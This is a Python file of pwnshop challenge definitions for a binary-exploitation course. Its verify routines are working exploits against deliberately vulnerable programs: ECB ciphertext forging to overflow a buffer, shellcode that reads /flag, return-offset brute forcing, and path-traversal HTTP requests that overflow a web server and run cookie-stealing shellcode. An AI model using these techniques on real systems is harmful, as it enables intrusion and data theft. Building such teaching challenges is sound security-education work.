import requests
import pwnshop
import struct
import time
import pwn
import os

from ..reverse_engineering import CIMGBase

def ensure_key(c):
    if not os.path.exists("/challenge/.key"):
        open("/challenge/.key", "wb").write(os.urandom(16))
    if not os.path.exists(c.work_dir+"/.key"):
        open(c.work_dir+"/.key", "wb").write(os.urandom(16))

class DecryptOverflowWin(pwnshop.Challenge):
    PIE = False
    CANARY = False

    TEMPLATE_PATH = "toddlerzero/decrypt_overflow.c"
    LINK_LIBRARIES = ["capstone", "ssl", "crypto"]

    challenge_function = True
    print_greeting = False
    constant_goodbye = False
    win_function = True
    win_variable = False

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.message_buffer_length = self.random.randrange(16,64)

    def verify(self, **kwargs):
        ensure_key(self)

        with self.run_challenge(**kwargs) as process:
            process.send("A"*16)
            assert b"VERIFIED" in process.readall()
            assert pwnshop.did_abort(process)

class Dispatch(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "dispatch.py"

    aes_mode = "AES.MODE_ECB"
    maximum_length = 16

    def verify(self, **kwargs):
        ensure_key(self)

        with self.run_challenge(**kwargs) as process:
            process.send("A"*16)
            assert len(process.readall()) == 16*3

class ForgedOverflowWin(pwnshop.ChallengeGroup):
    challenges = [ Dispatch, DecryptOverflowWin ]
    challenge_names = [ "dispatch", "vulnerable-overflow" ]

    def verify(self, **kwargs):
        super().verify(**kwargs)
        self.challenge_instances[0].verify()
        self.challenge_instances[1].verify()

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.send("A"*16)
            good_header = process.read(16)
            a16 = process.read(16)
            p16 = process.read(16)
            assert not process.readall()

        with self.challenge_instances[1].run_challenge(**kwargs) as process:
            process.send(good_header + a16*10 + p16)
            assert b"A"*16*10 in process.readall()
            assert pwnshop.did_segfault(process)

        elf = pwn.ELF(self.challenge_instances[1].bin_path)

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.send(pwn.p64(elf.symbols["win"])*2)
            good_header = process.read(16)
            w16 = process.read(16)
            p16 = process.read(16)
            assert not process.readall()

        with self.challenge_instances[1].run_challenge(**kwargs) as process:
            process.send(good_header + w16*20 + p16)
            assert self.flag in process.readall()

class DecryptOverflowShellcode(DecryptOverflowWin):
    EXEC_STACK = True
    disable_aslr = True

    win_function = False

    def verify(self, **kwargs):
        ensure_key(self)
        assert os.path.exists(self.work_dir+"/.key")

        with self.run_challenge(**kwargs) as process:
            assert os.path.exists(self.work_dir+"/.key")
            process.send("A"*16)
            assert b"VERIFIED" in process.readall()
            assert pwnshop.did_abort(process)

        core = pwn.Coredump("core")
        rsp1 = core.rsp

        with self.run_challenge(**kwargs) as process:
            process.send("A"*16)
            assert b"VERIFIED" in process.readall()
            assert pwnshop.did_abort(process)

        core = pwn.Coredump("core")
        rsp2 = core.rsp

        assert rsp1 == rsp2

class ForgedOverflowShellcode(pwnshop.ChallengeGroup):
    challenges = [ Dispatch, DecryptOverflowShellcode ]
    challenge_names = [ "dispatch", "vulnerable-overflow" ]

    def verify(self, **kwargs):
        super().verify(**kwargs)
        self.challenge_instances[0].verify()
        self.challenge_instances[1].verify()

        env = { "SHELLCODE": pwn.asm(pwn.shellcraft.readfile("/flag", 1)) }
        #env = { "SHELLCODE": b"\xeb\xfe" }

        with self.challenge_instances[1].run_challenge(**kwargs, env=env) as process:
            process.send("A"*16)
            process.wait()
            assert pwnshop.did_abort(process)
        core = pwn.Coredump("core")
        shellcode_addr = core.stack.find(env["SHELLCODE"])

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.send(pwn.p64(shellcode_addr)*2)
            good_header = process.read(16)
            s16 = process.read(16)
            p16 = process.read(16)
            assert not process.readall()

        with self.challenge_instances[1].run_challenge(**kwargs, env=env) as process:
            process.send(good_header + s16*10 + p16)
            process.wait()
            assert pwnshop.did_segfault(process)
            assert self.flag in process.readall()

# if we want to do things more right
#        cyclic = pwn.cyclic(160)
#        cyclic_cipher = b""
#        for co in range(0, len(cyclic), 16):
#            with self.challenge_instances[0].run_challenge(**kwargs) as process:
#                process.send(cyclic[co:co+16])
#                good_header = process.read(16)
#                cyclic_cipher += process.read(16)
#                p16 = process.read(16)
#                assert not process.readall()
#
#        with self.challenge_instances[1].run_challenge(**kwargs) as process:
#            process.send(good_header + cyclic_cipher + p16)
#            print(process.readall())
#            assert pwnshop.did_segfault(process)
#
#        core = pwn.Coredump("core")
#        ret_offset = pwn.cyclic_find(pwn.u32(core.stack[core.rsp : core.rsp + 4]))

class CIMGScreenshotOverflowWin(CIMGBase):
    version = 4
    width = True
    height = True
    assert_ascii = True
    display = True
    framebuffer = True
    color = True
    sprites = True
    sprite_tiling = True
    sprite_transparency = True
    directives = { "RENDER_FRAME": 1, "RENDER_PATCH": 2, "CREATE_SPRITE": 3, "RENDER_SPRITE": 4, "FLUSH": 6, "SLEEP": 7, "SCREENSHOT_SPRITE": 1337 }
    win_function = True
    initial_won_value = 0
    win_repeats = 400

    # vulns
    unsafe_screenshot_overflow = True

    PIE = False
    CANARY = False

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.write(b"".join((
                b"cIMG\x04\x00" + bytes([184, 1]) + b"\x00\x00\x00\x00",
            )))
            assert self.flag not in process.readall()

        elf = pwn.ELF(self.bin_path)
        win_addr = elf.symbols["win"]

        for rip_offset in range(128, 184, 8):
            with self.run_challenge(**kwargs) as process:
                process.write(b"".join((
                    b"cIMG\x04\x00" + bytes([184, 1]) + b"\x01\x00\x00\x00",
                    struct.pack("<H", self.directives["SCREENSHOT_SPRITE"]) + bytes([1, 0, 0, rip_offset+8, 1])
                )))
                process.readall()
                if pwnshop.did_segfault(process):
                    break
        else:
            assert False

        #print("RIP offset:", rip_offset)

        for win_attempt in range(win_addr, win_addr+0xf000):
            win_packed = pwn.p64(win_attempt)
            if set((win_packed[0], win_packed[1])) - set(range(0x20, 0x7f)):
                continue

            with self.run_challenge(**kwargs, alarm=1) as process:
                process.write(b"".join((
                    b"cIMG\x04\x00" + bytes([184, 1]) + b"\x02\x00\x00\x00",
                    struct.pack("<H", self.directives["RENDER_PATCH"]) + bytes([rip_offset, 0, 2, 1]) + bytes([0, 0, 0, win_packed[0]]) + bytes([0,0,0,win_packed[1]]),
                    struct.pack("<H", self.directives["SCREENSHOT_SPRITE"]) + bytes([2, 0, 0, rip_offset+2, 1])
                )))
                process.stdin.close()
                result = process.readall()
                #print(result.decode('latin1'))
                if self.flag in result:
                    break

class CIMGScreenshotOverflow(CIMGBase):
    version = 4
    width = True
    height = True
    assert_ascii = True
    display = True
    framebuffer = True
    color = True
    sprites = True
    sprite_tiling = True
    sprite_transparency = True
    directives = { "RENDER_FRAME": 1, "RENDER_PATCH": 2, "CREATE_SPRITE": 3, "RENDER_SPRITE": 4, "LOAD_SPRITE": 5, "FLUSH": 6, "SLEEP": 7, "SCREENSHOT_SPRITE": 1337 }
    win_function = False

    # vulns
    unsafe_screenshot_overflow = True
    unchecked_load_sprite = True

    PIE = False
    CANARY = False
    EXEC_STACK = True
    disable_aslr = True

    def verify(self, **kwargs):
        env = { "SHELLCODE": pwn.asm(pwn.shellcraft.readfile("/flag", 1)) }

        with self.run_challenge(**kwargs, env=env) as process:
            process.write(b"".join((
                b"cIMG\x04\x00" + bytes([184, 1]) + b"\x01\x00\x00\x00",
                struct.pack("<H", self.directives["SCREENSHOT_SPRITE"]) + bytes([1, 0, 0, 184, 1])
            )))
            assert pwnshop.did_segfault(process)
            self.run_sh(f"chmod 644 {self.work_dir}/core", user="root")
            core = process.corefile
            assert pwn.u64(core.stack[core.rsp : core.rsp + 8]) == 0x2020202020202020
            shellcode_addr = core.stack.find(env["SHELLCODE"])

        with open(self.work_dir+"/sprite", "wb") as o:
            o.write(80*pwn.p64(shellcode_addr))
        transparent_char = sorted(set(b"1234567890")-set(pwn.p64(shellcode_addr)))[0]

        with self.run_challenge(**kwargs, env=env) as process:
            process.write(b"".join((
                b"cIMG\x04\x00" + bytes([184, 1]) + b"\x04\x00\x00\x00",
                struct.pack("<H", self.directives["LOAD_SPRITE"]) + bytes([1, 184, 1]) + (self.work_dir+"/sprite").encode().ljust(255, b"\0"),
                struct.pack("<H", self.directives["RENDER_SPRITE"]) + bytes([1, 0, 0, 0, 0, 0, 1, 1, transparent_char]),
                struct.pack("<H", self.directives["FLUSH"]) + bytes([0]),
                struct.pack("<H", self.directives["SCREENSHOT_SPRITE"]) + bytes([2, 0, 0, 184, 1])
            )))
            result = process.readall()
            assert pwnshop.did_segfault(process)
            assert self.flag in result

class WebServerOverflow(pwnshop.Challenge):
    PIE = False
    CANARY = False
    EXEC_STACK = True
    disable_aslr = True

    TEMPLATE_PATH = "toddlerzero/web.c"
    LINK_LIBRARIES = ["capstone"]

    challenge_function = True
    print_greeting = False
    constant_goodbye = False
    win_function = False
    win_variable = False
    port = 80

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.pwnversion = "1."+"3"*self.random.randrange(2,100)+".7"

    def verify(self, **kwargs):
        env = { "SHELLCODE": pwn.asm(pwn.shellcraft.readfile("/flag", 1) + pwn.shellcraft.exit()) }
        #env = { "SHELLCODE": b"\xeb\xfe" }

        os.makedirs(self.work_dir+"/files", exist_ok=True)
        with open(self.work_dir+"/files/index.txt", "wb") as o:
            o.write(b"Hello world!")
        with open(self.work_dir+"/c8191", "wb") as o:
            o.write(pwn.cyclic(8191))

        with self.run_challenge(**kwargs, env=env) as process:
            process.readuntil("Listening")
            with pwn.remote(self.hostname, self.port) as r:
                r.send("GET index.txt HTTP/1.1\n\n")
                response = r.readall()
                assert b"Hello world!" in response

            process.clean()
            with pwn.remote(self.hostname, self.port) as r:
                r.send(f"GET ../../../../../{self.work_dir}/c8191 HTTP/1.1\n\n")
                r.readall()

            #print(process.clean().decode())
            assert pwnshop.did_segfault(process)
            # WHAT THE ACTUAL FUCK
            self.run_sh(f"chmod 644 {self.work_dir}/core", user="root")
            core = process.corefile
            #ret_offset = pwn.cyclic_find(pwn.u32(core.stack[core.rsp : core.rsp + 4]))
            #print("RET OFFSET:", ret_offset)
            shellcode_addr = core.stack.find(env["SHELLCODE"])

        try:
            with pwn.remote(self.hostname, self.port) as r:
                assert False
        except pwn.PwnlibException:
            pass

        #with self.run_challenge(**kwargs, env=env) as process:
        #   with open(self.work_dir+"/p", "wb") as o:
        #       o.write(b"A"*(ret_offset) + b"B"*8)

        #   process.clean()
        #   with pwn.remote(self.hostname, self.port) as r:
        #       r.send(f"GET ../../../../../{self.work_dir}/p HTTP/1.1\n\n")
        #       response = r.readall()
        #       print(response)
        #       assert b"Content-type" in response
        #       assert pwnshop.did_segfault(process)
        #       core = process.corefile
        #       retaddr = core.stack[core.rsp : core.rsp + 8]
        #       print(ret_addr)
        #       assert ret_addr == b"B"*8

        for padding_len in range(8):
            with open(self.work_dir+"/p", "wb") as o:
                o.write(b"A"*(padding_len) + pwn.p64(shellcode_addr)*(8184//8))


            with self.run_challenge(**kwargs, env=env) as process:
                process.readuntil("Listening")
                with pwn.remote(self.hostname, self.port) as r:
                    r.send(f"GET ../../../../../{self.work_dir}/p HTTP/1.1\n\n")
                    r.readall()
                if self.flag in process.readall():
                    break
        else:
            assert False

class WebServerUnprivileged(WebServerOverflow):
    drop_privs = True

    def verify(self, **kwargs):
        try:
            super().verify(**kwargs)
            assert False
        except AssertionError:
            pass

class CookieVictim(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "victim.py"
    port = 80

class CookieStealingShellcode(pwnshop.ChallengeGroup):
    challenges = [ CookieVictim, WebServerUnprivileged ]
    #challenges = [ CookieVictim, WebServerOverflow ]
    challenge_names = [ "victim", "server" ]

    def verify(self, **kwargs):
        super().verify(**kwargs)
        #self.challenge_instances[0].verify()
        self.challenge_instances[1].verify()

        assert self.challenge_instances[0].port == self.challenge_instances[1].port

        env = { "SHELLCODE": pwn.asm(
            pwn.shellcraft.write(1, "YEAH", 4) +
            pwn.shellcraft.accept(3) + pwn.shellcraft.read(6, 'rsp', 1024) + pwn.shellcraft.write(1, 'rsp', 1024) +
            pwn.shellcraft.exit()
        ) }

        with open(self.work_dir+"/c8191", "wb") as o:
            o.write(pwn.cyclic(8191))

        with self.challenge_instances[1].run_challenge(**kwargs, env=env) as process:
            process.readuntil("Listening")
            with pwn.remote(self.challenge_instances[1].hostname, self.challenge_instances[1].port) as r:
                r.send(f"GET ../../../../../{self.work_dir}/c8191 HTTP/1.1\n\n")
                r.readall()
            assert pwnshop.did_segfault(process)
            self.run_sh(f"chmod 644 {self.work_dir}/core", user="root")
            core = process.corefile
            shellcode_addr = core.stack.find(env["SHELLCODE"])

        for padding_len in range(8):
            with open(self.work_dir+"/p", "wb") as o:
                o.write(b"A"*(padding_len) + pwn.p64(shellcode_addr)*(8184//8))

            with self.challenge_instances[1].run_challenge(**kwargs, env=env) as process:
                process.readuntil("Listening")
                with pwn.remote(self.hostname, self.challenge_instances[0].port) as r:
                    r.send(f"GET ../../../../../{self.work_dir}/p HTTP/1.1\n\n")
                    r.clean()
                if b"YEAH" not in process.clean():
                    continue
                with self.challenge_instances[0].run_challenge(**kwargs, env=env) as victim:
                    victim.wait()

                assert self.flag in process.readall()
                return

        assert False
